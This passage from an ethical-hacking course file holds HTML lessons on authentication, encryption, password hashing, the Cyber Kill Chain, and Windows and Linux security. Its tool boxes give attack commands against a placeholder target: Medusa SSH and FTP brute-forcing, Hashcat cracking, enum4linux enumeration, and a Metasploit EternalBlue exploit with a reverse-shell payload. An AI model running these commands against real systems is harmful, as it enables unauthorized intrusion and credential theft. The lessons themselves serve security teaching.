          <p class="mb-4 text-gray-300">In cybersecurity, controlling who can access a system and what they can do after access is one of the most important security objectives. This control is achieved using two closely related but fundamentally different concepts: <span class="text-white font-semibold">Authentication</span> and <span class="text-white font-semibold">Authorization</span>. Many beginners confuse these terms or assume they mean the same thing, but in reality, they serve very different purposes in securing systems, networks, and applications.</p>
          <p class="mb-6 text-gray-300">Understanding the difference between authentication and authorization is critical for designing secure systems, enforcing security policies, and preventing unauthorized access or privilege abuse.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">What is Authentication?</h2>
          <p class="mb-3 text-gray-300">Authentication is the process of verifying the identity of a user, device, or system. It answers the question: <span class="italic text-gray-200">“Who are you?”</span> During authentication, the system checks whether the entity requesting access is truly who they claim to be by validating credentials. Authentication is always the first step in the access control process — without it, the system cannot trust the user and therefore cannot safely allow access to resources.</p>

          <h3 class="text-lg font-semibold mb-2 text-blue-400">Types of Authentication Factors</h3>
          <ul class="list-disc pl-6 mb-4 text-gray-300 space-y-1">
            <li><span class="text-white">Something you know</span> — passwords, PINs</li>
            <li><span class="text-white">Something you have</span> — smart cards, OTP tokens</li>
            <li><span class="text-white">Something you are</span> — biometrics like fingerprints or facial recognition</li>
          </ul>
          <p class="mb-6 text-gray-300">Using multiple factors together is known as <span class="text-white font-semibold">Multi-Factor Authentication (MFA)</span>, which significantly improves security.</p>

          <div class="p-4 rounded-lg border border-red-500/20 bg-red-500/5 mb-6">
            <h3 class="text-lg font-semibold mb-2 text-red-400">Authentication Weaknesses</h3>
            <ul class="list-disc pl-6 text-gray-300 space-y-1">
              <li>Weak or reused passwords</li>
              <li>Brute-force protection not enabled</li>
              <li>Credentials transmitted without encryption</li>
              <li>Users falling victim to phishing attacks</li>
            </ul>
            <p class="mt-2 text-sm text-gray-400">Because of these risks, security teams test authentication using controlled tools to ensure policies are strong.</p>
          </div>

          <h2 class="text-xl font-semibold mb-3 text-white">What is Authorization?</h2>
          <p class="mb-3 text-gray-300">Authorization is the process of determining what an authenticated user is allowed to do. It answers the question: <span class="italic text-gray-200">“What are you allowed to access or perform?”</span> Authorization comes after authentication. Even if a user is successfully authenticated, they should not automatically gain full access to all resources. Authorization ensures that users only have permissions necessary for their role.</p>

          <h3 class="text-lg font-semibold mb-2 text-green-400">Authorization Models</h3>
          <div class="grid grid-cols-1 md:grid-cols-3 gap-4 mb-6">
            <div class="p-3 rounded bg-[#252526] border border-gray-700">
              <h4 class="font-bold text-white mb-1">Role-Based Access Control (RBAC)</h4>
              <p class="text-sm text-gray-300">Permissions are assigned based on job roles.</p>
            </div>
            <div class="p-3 rounded bg-[#252526] border border-gray-700">
              <h4 class="font-bold text-white mb-1">Discretionary Access Control (DAC)</h4>
              <p class="text-sm text-gray-300">Resource owners decide who can access their data.</p>
            </div>
            <div class="p-3 rounded bg-[#252526] border border-gray-700">
              <h4 class="font-bold text-white mb-1">Mandatory Access Control (MAC)</h4>
              <p class="text-sm text-gray-300">Access decisions are based on strict security labels.</p>
            </div>
          </div>

          <h2 class="text-xl font-semibold mb-3 text-white">Authentication vs Authorization (Conceptual Difference)</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Authentication verifies identity</li>
            <li>Authorization grants or denies permissions</li>
            <li>Authentication happens first</li>
            <li>Authorization follows authentication</li>
            <li>Authentication uses credentials</li>
            <li>Authorization uses access rules and policies</li>
          </ul>
          <p class="mb-6 text-gray-300">Both are essential for secure systems. Weakness in either can lead to serious security breaches.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Real-World Example</h2>
          <div class="bg-[#252526] p-4 rounded border border-gray-700 mb-6">
            <p class="text-gray-300 mb-2">When you log into an online banking application:</p>
            <ul class="list-disc pl-6 text-gray-300 space-y-1">
              <li>Entering username and password → <span class="text-blue-300 font-semibold">Authentication</span></li>
              <li>Being allowed to view your account balance but not edit system settings → <span class="text-green-300 font-semibold">Authorization</span></li>
            </ul>
          </div>

          <h2 class="text-xl font-semibold mb-3 text-white">Role of Kali Linux Tools in Testing Authentication</h2>
          <p class="mb-4 text-gray-300">Security professionals use Kali Linux tools to test authentication mechanisms, check for weak credentials, and ensure that authorization controls are not bypassable. Under controlled, ethical conditions, tools like <span class="font-semibold text-white">Medusa</span> help validate that authentication and lockout policies are effective.</p>
        `,
        duration: '15 min',
        syntax: [
          {
            title: 'Kali Linux Tool – Authentication Testing',
            content: `🛠 Tool Name: Medusa

Related Concept: Authentication Mechanisms

What is Medusa?
Medusa is a fast, parallel login brute-force tool available in Kali Linux. It is used to test authentication services such as SSH, FTP, HTTP, and databases. From a defensive standpoint, Medusa helps security teams identify weak authentication mechanisms and enforce stronger authentication policies.

Why This Tool Matches This Topic
Authentication security is critical. Medusa allows ethical testers to:
Detect weak or default credentials
Test login protection mechanisms
Verify account lockout policies
Strengthen authentication controls

Basic Commands
Test SSH Authentication
medusa -h target_ip -u user -P passwords.txt -M ssh

Test FTP Authentication
medusa -h target_ip -U users.txt -P pass.txt -M ftp

Increase Speed (Parallel Attempts)
medusa -t 5 -h target_ip -u admin -P pass.txt -M ssh`
          }
        ]
      },
      {
        title: 'Encryption Basics (Symmetric & Asymmetric)',
        content: `
          <h2 class="text-xl font-semibold mb-3 text-white">Introduction to Encryption</h2>
          <p class="mb-4 text-gray-300">Encryption is one of the most important techniques in cybersecurity. It protects information by converting readable data (plaintext) into an unreadable form (ciphertext). The goal is to ensure that even if data is intercepted, stolen, or accessed without permission, it cannot be understood without the correct decryption key.</p>
          <p class="mb-6 text-gray-300">Modern systems rely on encryption to protect emails, websites, mobile apps, cloud storage, messaging platforms, and financial transactions. Without encryption, sensitive information such as passwords, credit card numbers, personal records, and confidential business data would be exposed to attackers.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">What is Symmetric Encryption?</h2>
          <p class="mb-4 text-gray-300">Symmetric encryption uses the same key for both encryption and decryption. Both sender and receiver must securely share and protect this secret key. Because one key is used on both sides, symmetric encryption is fast and efficient, making it ideal for large amounts of data.</p>
          <p class="mb-4 text-gray-300">The biggest challenge is secure key distribution. If the secret key is intercepted while being shared, an attacker can decrypt all data. For this reason, symmetric encryption is often combined with other mechanisms for secure key exchange.</p>
          <div class="p-4 rounded-lg border border-blue-500/20 bg-blue-500/5 mb-5">
            <h3 class="text-lg font-semibold mb-2 text-blue-400">Common Symmetric Algorithms</h3>
            <ul class="list-disc pl-6 text-gray-300 space-y-1">
              <li>AES (Advanced Encryption Standard)</li>
              <li>DES (Data Encryption Standard)</li>
              <li>3DES (Triple DES)</li>
            </ul>
            <p class="mt-3 text-sm text-gray-400">Use cases: disk/file encryption, database protection, secure data storage.</p>
          </div>

          <h2 class="text-xl font-semibold mb-3 text-white">What is Asymmetric Encryption?</h2>
          <p class="mb-4 text-gray-300">Asymmetric encryption (public-key cryptography) uses two different keys: a public key and a private key. The public key is shared openly to encrypt data; the private key is kept secret to decrypt data. This solves the key distribution problem in symmetric encryption because the private key is never shared.</p>
          <p class="mb-4 text-gray-300">Asymmetric encryption is computationally slower than symmetric encryption, so it is usually used for key exchange, authentication, and digital signatures, rather than encrypting large data volumes.</p>
          <div class="p-4 rounded-lg border border-green-500/20 bg-green-500/5 mb-5">
            <h3 class="text-lg font-semibold mb-2 text-green-400">Common Asymmetric Algorithms</h3>
            <ul class="list-disc pl-6 text-gray-300 space-y-1">
              <li>RSA</li>
              <li>ECC (Elliptic Curve Cryptography)</li>
              <li>DSA</li>
            </ul>
          </div>

          <h2 class="text-xl font-semibold mb-3 text-white">How They Work Together</h2>
          <p class="mb-3 text-gray-300">In real-world systems, both encryption types are used together. For example, in <span class="text-white font-semibold">HTTPS</span> communication:</p>
          <ul class="list-disc pl-6 mb-4 text-gray-300 space-y-1">
            <li>Asymmetric encryption securely exchanges a symmetric key.</li>
            <li>Symmetric encryption then encrypts the actual data transfer.</li>
          </ul>
          <p class="mb-6 text-gray-300">This hybrid approach provides both strong security and high performance, forming the backbone of secure internet communication.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Importance of Encryption in Cybersecurity</h2>
          <ul class="list-disc pl-6 mb-4 text-gray-300 space-y-2">
            <li>Protects data confidentiality</li>
            <li>Prevents data theft during transmission</li>
            <li>Secures stored data</li>
            <li>Enables secure authentication</li>
            <li>Ensures privacy and trust</li>
          </ul>
          <p class="mb-6 text-gray-300">Without encryption, attackers could intercept traffic, read sensitive information, and impersonate legitimate users.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Role of Kali Linux Tools in Encryption</h2>
          <p class="mb-4 text-gray-300">Security practitioners use Kali Linux tools to understand, test, and implement encryption. Tools like <span class="font-semibold text-white">OpenSSL</span> allow users to generate keys, perform symmetric and asymmetric encryption, create certificates, and experiment with real-world cryptographic workflows in a controlled environment.</p>
        `,
        duration: '20 min',
        syntax: [
          {
            title: 'Kali Linux Tool – Encryption Practice',
            content: `🛠 Tool Name: OpenSSL

Related Concept: Symmetric & Asymmetric Encryption

What is OpenSSL?
OpenSSL is a powerful cryptographic toolkit included in Kali Linux. It supports encryption, decryption, key generation, digital certificates, and hashing. It is widely used to practice and understand real-world encryption concepts.

Why This Tool Matches This Topic
OpenSSL allows students to:
Perform symmetric encryption and decryption
Generate public-private key pairs
Encrypt data using public keys
Understand real encryption workflows

Basic Commands
Symmetric Encryption (AES)
openssl enc -aes-256-cbc -in file.txt -out file.enc

Symmetric Decryption
openssl enc -d -aes-256-cbc -in file.enc -out file.txt

Generate RSA Private Key
openssl genrsa -out private.key 2048

Generate Public Key
openssl rsa -in private.key -pubout -out public.key

Asymmetric Encryption Using Public Key
openssl rsautl -encrypt -inkey public.key -pubin -in file.txt -out file.enc

Asymmetric Decryption Using Private Key
openssl rsautl -decrypt -inkey private.key -in file.enc -out file.txt`
          }
        ]
      },
      {
        title: 'Hashing, Salting & Password Security',
        content: `
          <h2 class="text-xl font-semibold mb-3 text-white">Introduction</h2>
          <p class="mb-4 text-gray-300">In cybersecurity, protecting passwords is one of the most critical responsibilities of any system. Passwords are the primary method of authentication for users, administrators, and services. If passwords are stored or handled incorrectly, attackers can easily compromise entire systems. This is why modern security does not store passwords directly, but instead relies on hashing, salting, and strong password security practices.</p>
          <p class="mb-6 text-gray-300">Hashing and salting are defensive techniques designed to protect passwords even if a database is stolen. Understanding these concepts is essential for anyone working in cyber security, ethical hacking, or system administration.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">What is Hashing?</h2>
          <p class="mb-4 text-gray-300">Hashing is a one-way mathematical process that converts input data (such as a password) into a fixed-length string of characters called a hash. Unlike encryption, hashing cannot be reversed. This means that once a password is hashed, the original password cannot be retrieved from the hash.</p>
          <p class="mb-4 text-gray-300">When a user creates an account, their password is hashed and stored in the database. When the user logs in, the entered password is hashed again and compared with the stored hash. If both hashes match, authentication is successful. Hashing protects passwords because even if attackers gain access to the database, they only see hashes — not the actual passwords.</p>
          
          <div class="p-4 rounded-lg border border-blue-500/20 bg-blue-500/5 mb-5">
            <h3 class="text-lg font-semibold mb-2 text-blue-400">Common Hashing Algorithms</h3>
            <ul class="list-disc pl-6 text-gray-300 space-y-1">
              <li>MD5 <span class="text-gray-400">(now considered insecure)</span></li>
              <li>SHA-1 <span class="text-gray-400">(deprecated)</span></li>
              <li>SHA-256 / SHA-512</li>
              <li>bcrypt</li>
              <li>PBKDF2</li>
              <li>Argon2</li>
            </ul>
          </div>

          <h2 class="text-xl font-semibold mb-3 text-white">Why Hashing Alone Is Not Enough</h2>
          <p class="mb-4 text-gray-300">While hashing improves security, it is not sufficient on its own. Attackers can use precomputed hash tables (rainbow tables) or perform brute-force attacks to guess passwords and compare their hashes. If two users use the same password, their hashes will also be identical, which further simplifies attacks.</p>
          <p class="mb-6 text-gray-300">This weakness is addressed using <span class="text-white font-semibold">salting</span>.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">What is Salting?</h2>
          <p class="mb-4 text-gray-300">Salting is the process of adding a random value (called a <span class="text-white font-semibold">salt</span>) to a password before hashing it. This ensures that even if two users have the same password, their hashes will be completely different.</p>
          <p class="mb-4 text-gray-300">The salt is typically stored alongside the hash in the database. During login, the same salt is added to the entered password before hashing and comparison.</p>
          <div class="p-4 rounded-lg border border-green-500/20 bg-green-500/5 mb-5">
            <h3 class="text-lg font-semibold mb-2 text-green-400">Salting Protects Against</h3>
            <ul class="list-disc pl-6 text-gray-300 space-y-1">
              <li>Rainbow table attacks</li>
              <li>Hash comparison attacks</li>
              <li>Mass password cracking</li>
            </ul>
          </div>

          <h2 class="text-xl font-semibold mb-3 text-white">Password Security Best Practices</h2>
          <p class="mb-3 text-gray-300">Strong password security goes beyond hashing and salting. Organizations must enforce proper password policies to reduce the chances of compromise.</p>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-2">
            <li>Enforce long and complex passwords</li>
            <li>Prevent password reuse</li>
            <li>Implement account lockout policies</li>
            <li>Use multi-factor authentication (MFA)</li>
            <li>Regularly audit password storage mechanisms</li>
          </ul>
          <p class="mb-6 text-gray-300">Even with secure hashing, weak passwords like <span class="font-mono text-gray-200">password123</span> or <span class="font-mono text-gray-200">admin@123</span> can be cracked quickly.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Attacker Perspective (Why Passwords Are Targeted)</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-2">
            <li>One password can unlock multiple systems</li>
            <li>Users often reuse passwords across platforms</li>
            <li>Weak hashing algorithms can be cracked quickly</li>
            <li>Stolen credentials can be sold or reused</li>
          </ul>
          <p class="mb-6 text-gray-300">This is why professionals must understand both defensive storage techniques and offensive password attack methods — strictly for ethical and educational purposes.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Role of Kali Linux Tools in Password Security</h2>
          <p class="mb-4 text-gray-300">Kali Linux includes tools that help security professionals test the strength of hashed passwords. Under controlled, ethical conditions, tools like <span class="font-semibold text-white">Hashcat</span> simulate real-world attacks against password hashes to identify weak algorithms, poor salting practices, and weak user passwords.</p>
        `,
        duration: '20 min',
        syntax: [
          {
            title: 'Kali Linux Tool – Password Hash Testing',
            content: `🛠 Tool Name: Hashcat

Related Concept: Hashing, Salting & Password Security

What is Hashcat?
Hashcat is a powerful password recovery and hash cracking tool available in Kali Linux. From a defensive and educational perspective, it is used to test the strength of hashed passwords and evaluate whether hashing and salting mechanisms are secure.

Why This Tool Matches This Topic
Hashcat helps:
Identify weak hashing algorithms
Test password strength
Validate salting effectiveness
Improve password security policies

Basic Commands
Identify Hash Type
hashcat -h

Crack MD5 Hash Using Wordlist
hashcat -m 0 hash.txt wordlist.txt

Crack SHA-256 Hash
hashcat -m 1400 hash.txt wordlist.txt

Show Cracked Passwords
hashcat -m 0 hash.txt wordlist.txt --show`
          }
        ]
      },
      {
        title: 'Introduction to Ethical Hacking & Cyber Kill Chain',
        content: `
          <h2 class="text-xl font-semibold mb-3 text-white">Introduction</h2>
          <p class="mb-4 text-gray-300">As cyber attacks continue to grow in complexity and scale, organizations can no longer rely only on defensive security measures. This is where ethical hacking plays a crucial role. Ethical hacking involves legally and systematically testing systems, networks, and applications to identify security weaknesses before malicious attackers can exploit them. Ethical hackers think like attackers but act with permission, responsibility, and professional ethics.</p>
          <p class="mb-6 text-gray-300">To understand how attacks happen in the real world, cybersecurity professionals use structured models. One of the most widely used attack models is the <span class="text-white font-semibold">Cyber Kill Chain</span>, which breaks down a cyber attack into clear stages. Understanding this model helps defenders detect, prevent, and respond to attacks more effectively.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">What is Ethical Hacking?</h2>
          <p class="mb-4 text-gray-300">Ethical hacking is the authorized practice of probing systems for vulnerabilities using the same techniques and tools used by real attackers. The main goal is not to cause damage, but to improve security by identifying and fixing weaknesses.</p>
          <p class="mb-4 text-gray-300">Ethical hackers work under defined rules of engagement and legal permissions. They document findings, provide recommendations, and help organizations strengthen their security posture. Ethical hacking is used in penetration testing, red teaming, vulnerability assessments, and security audits.</p>
          <p class="mb-6 text-gray-300">Ethical hacking requires a deep understanding of operating systems, networks, applications, malware, cryptography, and human behavior. It is a key skill set for roles such as penetration tester, security analyst, SOC analyst, and red teamer.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Difference Between Ethical Hackers and Malicious Hackers</h2>
          <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-6">
            <div class="p-3 rounded border border-green-500/20 bg-green-500/5">
              <h3 class="text-lg font-semibold text-green-400 mb-1">Ethical hackers</h3>
              <ul class="list-disc pl-6 text-gray-300 space-y-1">
                <li>Have written permission to test systems</li>
                <li>Follow legal and ethical guidelines</li>
                <li>Report vulnerabilities responsibly</li>
                <li>Aim to improve security</li>
              </ul>
            </div>
            <div class="p-3 rounded border border-red-500/20 bg-red-500/5">
              <h3 class="text-lg font-semibold text-red-400 mb-1">Malicious hackers</h3>
              <ul class="list-disc pl-6 text-gray-300 space-y-1">
                <li>Act without authorization</li>
                <li>Intend to steal, disrupt, or damage</li>
                <li>Hide their activities</li>
                <li>Cause financial and reputational loss</li>
              </ul>
            </div>
          </div>
          <p class="mb-6 text-gray-300">Understanding this distinction is essential for students entering the cybersecurity field.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">What is the Cyber Kill Chain?</h2>
          <p class="mb-4 text-gray-300">The Cyber Kill Chain is a framework developed to describe the stages of a cyber attack from start to finish. It helps security teams understand how attackers plan, execute, and complete attacks. By identifying attacks at early stages, organizations can stop them before serious damage occurs.</p>
          <p class="mb-6 text-gray-300">The Cyber Kill Chain consists of seven stages, each representing a critical step in an attack lifecycle.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Stages of the Cyber Kill Chain (Detailed Explanation)</h2>
          <div class="space-y-3 mb-6">
            <div class="p-3 rounded border border-blue-500/20 bg-blue-500/5">
              <h3 class="text-lg font-semibold text-blue-400 mb-1">1. Reconnaissance</h3>
              <p class="text-gray-300 text-sm">Attackers gather information about the target, such as IP addresses, domain names, technologies used, employee details, and exposed services. This phase involves passive and active information gathering.</p>
            </div>
            <div class="p-3 rounded border border-yellow-500/20 bg-yellow-500/5">
              <h3 class="text-lg font-semibold text-yellow-400 mb-1">2. Weaponization</h3>
              <p class="text-gray-300 text-sm">The attacker creates a malicious payload, often combining malware with an exploit, designed to exploit a specific vulnerability.</p>
            </div>
            <div class="p-3 rounded border border-orange-500/20 bg-orange-500/5">
              <h3 class="text-lg font-semibold text-orange-400 mb-1">3. Delivery</h3>
              <p class="text-gray-300 text-sm">The payload is delivered using phishing emails, malicious websites, infected USB drives, or compromised software updates.</p>
            </div>
            <div class="p-3 rounded border border-red-500/20 bg-red-500/5">
              <h3 class="text-lg font-semibold text-red-400 mb-1">4. Exploitation</h3>
              <p class="text-gray-300 text-sm">The delivered payload exploits a vulnerability in the target system, allowing the attacker to execute malicious code.</p>
            </div>
            <div class="p-3 rounded border border-purple-500/20 bg-purple-500/5">
              <h3 class="text-lg font-semibold text-purple-400 mb-1">5. Installation</h3>
              <p class="text-gray-300 text-sm">Malware is installed to maintain persistence, often by creating backdoors or modifying system settings.</p>
            </div>
            <div class="p-3 rounded border border-teal-500/20 bg-teal-500/5">
              <h3 class="text-lg font-semibold text-teal-400 mb-1">6. Command and Control (C2)</h3>
              <p class="text-gray-300 text-sm">The infected system establishes remote communication with the attacker’s server for control and further instructions.</p>
            </div>
            <div class="p-3 rounded border border-gray-500/20 bg-gray-500/5">
              <h3 class="text-lg font-semibold text-gray-300 mb-1">7. Actions on Objectives</h3>
              <p class="text-gray-300 text-sm">The attacker achieves their goal, such as data theft, system destruction, lateral movement, or ransomware deployment.</p>
            </div>
          </div>

          <h2 class="text-xl font-semibold mb-3 text-white">Why the Cyber Kill Chain Is Important</h2>
          <ul class="list-disc pl-6 mb-4 text-gray-300 space-y-2">
            <li>Detect attacks early</li>
            <li>Break attacks at multiple stages</li>
            <li>Improve incident response</li>
            <li>Design layered security defenses</li>
            <li>Train analysts to think like attackers</li>
          </ul>
          <p class="mb-6 text-gray-300">Each stage represents an opportunity to stop or slow down an attack.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Role of Kali Linux in Ethical Hacking</h2>
          <p class="mb-4 text-gray-300">Kali Linux is the primary operating system used by ethical hackers and penetration testers. It contains hundreds of tools for reconnaissance, exploitation, post-exploitation, and reporting. One of the most important tools used across multiple stages of the Cyber Kill Chain is the <span class="font-semibold text-white">Metasploit Framework</span>, which allows simulation of real-world attacks and controlled exploitation to validate defenses.</p>
        `,
        duration: '25 min',
        syntax: [
          {
            title: 'Kali Linux Tool – Ethical Hacking Framework',
            content: `🛠 Tool Name: Metasploit Framework

Related Concept: Ethical Hacking & Cyber Kill Chain

Basic Commands
msfconsole
search type:exploit name:windows
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target_ip
set PAYLOAD windows/meterpreter/reverse_tcp
run`
          }
        ]
      }
    ]
  },
  {
    id: 'module-2',
    title: 'Module 2: Operating Systems for Cyber Security',
    duration: '2 weeks',
    description: 'Deep dive into Windows and Linux operating systems from a security perspective.',
    lessons: [
      {
        title: 'Windows OS Basics for Security',
        content: `
          <h2 class="text-xl font-semibold mb-3 text-white">Introduction</h2>
          <p class="mb-4 text-gray-300">Microsoft Windows is one of the most widely used operating systems in the world, making it a major target for cyber attacks. From home users to enterprise environments, Windows systems store sensitive personal data, business information, credentials, and access to critical services. Because of its popularity, attackers actively search for weaknesses in Windows systems, which is why understanding Windows OS basics from a security perspective is essential for cybersecurity professionals.</p>
          <p class="mb-6 text-gray-300">Security in Windows is not just about antivirus software. It includes user accounts, permissions, system services, registry settings, patch management, logging, and built-in defensive mechanisms. A strong understanding of these components allows security teams to harden systems and detect malicious activity early.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Windows Architecture and Security Components</h2>
          <p class="mb-4 text-gray-300">Windows follows a layered architecture where security is enforced at multiple levels. At the core is the Windows Kernel, which manages memory, processes, and hardware access. Above the kernel are system services, user applications, and security subsystems. If attackers compromise any layer, they can escalate privileges or gain persistence.</p>
          <p class="mb-6 text-gray-300">Windows uses Security Identifiers (SIDs) to uniquely identify users, groups, and system accounts. Access to files, folders, and resources is controlled through Access Control Lists (ACLs), ensuring that only authorized users can perform specific actions.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">User Accounts and Privileges</h2>
          <p class="mb-3 text-gray-300">Windows systems operate using different account types:</p>
          <ul class="list-disc pl-6 mb-4 text-gray-300 space-y-1">
            <li>Standard User</li>
            <li>Administrator</li>
            <li>System Accounts (SYSTEM, Local Service, Network Service)</li>
          </ul>
          <p class="mb-4 text-gray-300">From a security standpoint, users should operate with standard privileges and elevate permissions only when necessary. This reduces the impact of malware infections. Attackers often attempt privilege escalation to move from a standard user to an administrator account.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">User Account Control (UAC)</h2>
          <p class="mb-4 text-gray-300">User Account Control (UAC) is a built-in Windows security feature that prevents unauthorized changes to the system. When a process attempts to perform an administrative task, UAC prompts for permission. This mechanism protects against silent malware installations and unauthorized system modifications.</p>
          <p class="mb-6 text-gray-300">Disabling UAC weakens system security and increases attack surface, making it a common target for attackers.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Windows File System Security</h2>
          <p class="mb-3 text-gray-300">Windows uses the NTFS file system, which supports:</p>
          <ul class="list-disc pl-6 mb-4 text-gray-300 space-y-1">
            <li>File permissions</li>
            <li>Encryption (EFS)</li>
            <li>Auditing</li>
            <li>Ownership controls</li>
          </ul>
          <p class="mb-6 text-gray-300">NTFS permissions play a crucial role in protecting sensitive system files, user data, and configuration files. Misconfigured permissions can allow attackers to modify critical files or inject malicious code.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Windows Defender and Built-In Protection</h2>
          <p class="mb-3 text-gray-300">Modern Windows versions include Windows Defender, a built-in antivirus and endpoint protection solution. It provides:</p>
          <ul class="list-disc pl-6 mb-4 text-gray-300 space-y-1">
            <li>Real-time malware protection</li>
            <li>Firewall integration</li>
            <li>Controlled folder access</li>
            <li>Cloud-based threat intelligence</li>
          </ul>
          <p class="mb-6 text-gray-300">Windows Defender is often targeted by malware, which attempts to disable or bypass it.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Windows Logging and Event Monitoring</h2>
          <p class="mb-3 text-gray-300">Windows records security-related activities in Event Viewer, including:</p>
          <ul class="list-disc pl-6 mb-4 text-gray-300 space-y-1">
            <li>Login attempts</li>
            <li>Privilege changes</li>
            <li>System errors</li>
            <li>Application crashes</li>
          </ul>
          <p class="mb-6 text-gray-300">Security logs are critical for detecting attacks, investigating incidents, and performing forensic analysis. Attackers often try to clear logs to hide their activity.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Why Windows Security Knowledge Is Important</h2>
          <p class="mb-3 text-gray-300">Understanding Windows OS security helps cybersecurity professionals:</p>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-2">
            <li>Harden systems against attacks</li>
            <li>Detect malicious behavior</li>
            <li>Investigate security incidents</li>
            <li>Prevent privilege escalation</li>
            <li>Protect enterprise environments</li>
          </ul>
          <p class="mb-6 text-gray-300">Ethical hackers also study Windows security to identify misconfigurations and vulnerabilities during penetration testing.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Role of Kali Linux in Windows Security Testing</h2>
          <p class="mb-4 text-gray-300">Kali Linux is frequently used to test the security of Windows systems in controlled environments. One of the most commonly used tools for analyzing Windows services and security weaknesses is <span class="font-semibold text-white">Enum4linux</span>.</p>
        `,
        duration: '15 min',
        syntax: [
          {
            title: 'Kali Linux Tool – Windows Enumeration',
            content: `🛠 Tool Name: Enum4linux

Related Concept: Windows OS Security & Enumeration

What is Enum4linux?
Enum4linux is a Kali Linux tool used to gather information from Windows and Samba systems. It helps security professionals identify user accounts, groups, shares, and security policies, which is essential for assessing Windows system security.

Why This Tool Matches This Topic
Enum4linux helps:
Enumerate Windows users and groups
Identify shared resources
Discover security misconfigurations
Understand Windows access controls

Basic Commands
Basic Enumeration
enum4linux target_ip

User Enumeration
enum4linux -u target_ip

Share Enumeration
enum4linux -S target_ip

All Enumeration Options
enum4linux -a target_ip`
          }
        ]
      },
      {
        title: 'Linux OS Basics (Directories & File Permissions)',
        content: `
          <h2 class="text-xl font-semibold mb-3 text-white">Introduction</h2>
          <p class="mb-4 text-gray-300">Linux is the backbone of most servers, cloud platforms, and security tools used in cybersecurity. Unlike Windows, Linux follows a strict permission-based model that controls who can access, modify, or execute files and directories. Understanding Linux directories and file permissions is extremely important for cybersecurity professionals because most attacks on Linux systems exploit weak permissions, misconfigured directories, or excessive privileges.</p>
          <p class="mb-6 text-gray-300">Linux treats everything as a file, including devices, processes, and network interfaces. This design gives Linux flexibility and power but also requires strong permission management to maintain security.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Linux Directory Structure</h2>
          <p class="mb-4 text-gray-300">Linux follows a hierarchical directory structure that starts from the root directory (<span class="font-mono text-gray-200">/</span>). Each directory has a specific role in system functionality and security.</p>
          <div class="space-y-3 mb-6">
            <div class="p-3 rounded border border-blue-500/20 bg-blue-500/5">
              <p class="text-gray-300 text-sm"><span class="font-semibold text-white">/bin</span> contains essential binary commands like <span class="font-mono text-gray-200">ls</span>, <span class="font-mono text-gray-200">cp</span>, and <span class="font-mono text-gray-200">cat</span> required for system operation.</p>
            </div>
            <div class="p-3 rounded border border-blue-500/20 bg-blue-500/5">
              <p class="text-gray-300 text-sm"><span class="font-semibold text-white">/sbin</span> holds system administration binaries such as <span class="font-mono text-gray-200">iptables</span> and <span class="font-mono text-gray-200">reboot</span>, usually accessible only to the root user.</p>
            </div>
            <div class="p-3 rounded border border-yellow-500/20 bg-yellow-500/5">
              <p class="text-gray-300 text-sm"><span class="font-semibold text-white">/etc</span> stores configuration files for the system and installed services. This directory is highly sensitive — changes here can alter system behavior, disable security features, or allow backdoor access.</p>
            </div>
            <div class="p-3 rounded border border-green-500/20 bg-green-500/5">
              <p class="text-gray-300 text-sm"><span class="font-semibold text-white">/home</span> contains user-specific data. Improper permissions can expose private files such as SSH keys, scripts, and credentials.</p>
            </div>
            <div class="p-3 rounded border border-purple-500/20 bg-purple-500/5">
              <p class="text-gray-300 text-sm"><span class="font-semibold text-white">/var</span> holds logs and variable data. Logs in <span class="font-mono text-gray-200">/var/log</span> are crucial for monitoring and forensics. Attackers often delete or alter these logs to hide traces of compromise.</p>
            </div>
            <div class="p-3 rounded border border-red-500/20 bg-red-500/5">
              <p class="text-gray-300 text-sm"><span class="font-semibold text-white">/tmp</span> is world-writable and used for temporary files. Its open permissions make it a common target for privilege escalation and malicious script execution.</p>
            </div>
          </div>

          <h2 class="text-xl font-semibold mb-3 text-white">Linux File Permissions</h2>
          <p class="mb-3 text-gray-300">Linux uses a permission model based on read (<span class="font-mono text-gray-200">r</span>), write (<span class="font-mono text-gray-200">w</span>), and execute (<span class="font-mono text-gray-200">x</span>). Permissions are assigned to three categories:</p>
          <ul class="list-disc pl-6 mb-4 text-gray-300 space-y-1">
            <li>Owner</li>
            <li>Group</li>
            <li>Others</li>
          </ul>
          <p class="mb-3 text-gray-300">Each file and directory has a permission string like:</p>
          <div class="bg-black/30 p-3 rounded text-center font-mono text-blue-300 border border-blue-500/30">-rwxr-xr--</div>
          <p class="mb-6 text-gray-300">This determines exactly who can access the file and what actions they can perform. Misconfigured permissions can allow unauthorized users to execute malicious scripts or modify system files.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Special Permissions</h2>
          <ul class="list-disc pl-6 mb-4 text-gray-300 space-y-1">
            <li><span class="font-semibold text-white">SUID (Set User ID)</span> – Executes a file with the owner’s privileges</li>
            <li><span class="font-semibold text-white">SGID (Set Group ID)</span> – Executes with group privileges</li>
            <li><span class="font-semibold text-white">Sticky Bit</span> – Prevents users from deleting files they do not own in shared directories</li>
          </ul>
